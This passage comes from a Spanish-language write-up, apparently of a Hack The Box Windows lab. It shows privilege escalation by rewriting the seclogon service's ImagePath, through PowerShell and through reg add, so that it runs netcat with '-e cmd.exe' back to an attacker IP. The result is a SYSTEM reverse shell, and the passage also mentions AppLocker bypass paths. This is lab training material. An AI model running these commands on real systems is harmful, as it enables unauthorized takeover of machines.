$canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match &quot;RP[A-Z]*?;;;AU&quot;) { $service }}
</code></pre>
<p>Dando como resultado la lista de los servicios buscados.</p>
<p><img src="images/post_10.png" alt="Servicios filtrados" /></p>
<p>Obteniendo lo anterior se puede modificar la propiedad <code>ImagePath</code> del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.</p>
<h4 id="usando-powershell"><a class="header" href="#usando-powershell">Usando powershell</a></h4>
<p>Mediante powershell habría que:</p>
<p><img src="images/post_11.png" alt="Valores de servicio a modificar" /></p>
<ol>
<li>
<p>Asegurar encontrarse en la ruta de los registros:</p>
<pre><code class="language-powershell">cd HKLM:\system\currentcontrolset\services
</code></pre>
</li>
<li>
<p>Obtener las propiedades del servicio requerido:</p>
<pre><code class="language-powershell">get-item -path seclogon
</code></pre>
</li>
<li>
<p>Visualizar el valor a cambiar de <code>ImagePath</code></p>
</li>
</ol>
<p><img src="images/post_12.png" alt="Modificaciones de servicio" /></p>
<ol>
<li>
<p>Ejecutar (para modificar los valores con los deseados):</p>
<pre><code class="language-powershell">set-itemproperty seclogon -name imagepath -value &quot;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&quot;
</code></pre>
</li>
<li>
<p>Obtener las propiedades del servicio requerido <code>seclogon</code> para validar el cambio.</p>
</li>
<li>
<p>Visualizar el cambio realizado a <code>ImagePath</code>.</p>
</li>
</ol>
<p>El cual al montar la conexión de escucha, bastaría con iniciar el servicio con:</p>
<pre><code class="language-powershell">start-service seclogon
</code></pre>
<p>Para así ejecutar el binario indicado.</p>
<p><img src="images/post_13.png" alt="Reverse shell como nt authority\system" /></p>
<h4 id="usando-cmd"><a class="header" href="#usando-cmd">Usando cmd</a></h4>
<p>Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:</p>
<ol>
<li>
<p>Para visualizar los valores del servicio:</p>
<pre><code class="language-powershell">reg query HKLM\system\currentcontrolset\services\seclogon
</code></pre>
</li>
<li>
<p>Para cambiar los valores de la propiedad <code>ImagePath</code> de acuerdo a lo encontrado en <a href="https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10">este blog</a> para realizar los cambios e identificar el tipo de dato a cambiar <code>REG_EXPAND_SZ</code> para efectuarlo correctamente:</p>
<pre><code class="language-powershell">reg add HKLM\system\currentcontrolset\services\seclogon /v ImagePath /t REG_EXPAND_SZ /d &quot;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&quot; /f
</code></pre>
</li>
<li>
<p>Para iniciar el servicio:</p>
<pre><code class="language-powershell">sc start seclogon
</code></pre>
</li>
</ol>
<h1 id="notas-adicionales"><a class="header" href="#notas-adicionales">Notas adicionales</a></h1>
<p>Mientras resolvía la máquina encontré diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la máquina o lo ejecutaba a través del cliente smb, logré solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalación de privilegios.</p>
<p>Dado que durante el proceso de resolución personalmente busco lo equivalente a comparar respuestas en una evaluación por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de <a href="https://0xdf.gitlab.io/">0xdf</a> e <a href="https://www.youtube.com/c/ippsec">IppSec</a>, noté que ambos hicieron referencia a <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">AppLocker</a> ya que el mismo problema se presentó. Después de buscar más información al respecto, encontré que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">repositorios de github</a> dándole motivo al uso de la ruta <code>C:\Windows\System32\spool\drivers\color</code> que se emplea en los write-ups.</p>
<h1 id="referencias"><a class="header" href="#referencias">Referencias</a></h1>
<ul>
<li><a href="https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html">SQL Injection</a>.</li>
<li><a href="https://crackstation.net/">CrackStation</a>.</li>
<li><a href="https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/">SQLI to RCE</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">How to: Find the Web Application Root</a>.</li>
<li><a href="https://lazyadmin.nl/powershell/start-process/">How to use Start Process in PowerShell</a>.</li>
<li><a href="https://davidhamann.de/2019/12/08/running-command-different-user-powershell/">Running commands in a specific user context in PowerShell</a>.</li>
<li><a href="https://stackoverflow.com/questions/60248354/powershell-jobs-vs-start-process">StackOverflow - PowerShell Jobs vs Start-Process</a>.</li>
<li><a href="https://adamtheautomator.com/powershell-get-computer-name/">Powershell get computer name</a>.</li>
<li><a href="https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10">How to edit the Registry using Command Prompt on Windows 10</a>.</li>
<li><a href="https://www.itprotoday.com/compute-engines/what-are-errorcontrol-start-and-type-values-under-services-subkeys">Significado del valor Start en registros</a>.</li>
<li><a href="https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/">Start Stop service rights to non administrators</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">What is AppLocker?</a>.</li>
<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">Ultimate AppLocker ByPass List</a>.</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../../htb/boxes/windows/2_medio/Silo/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../../../../htb/boxes/windows/3_dificil/Search/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../../htb/boxes/windows/2_medio/Silo/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../../../../htb/boxes/windows/3_dificil/Search/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
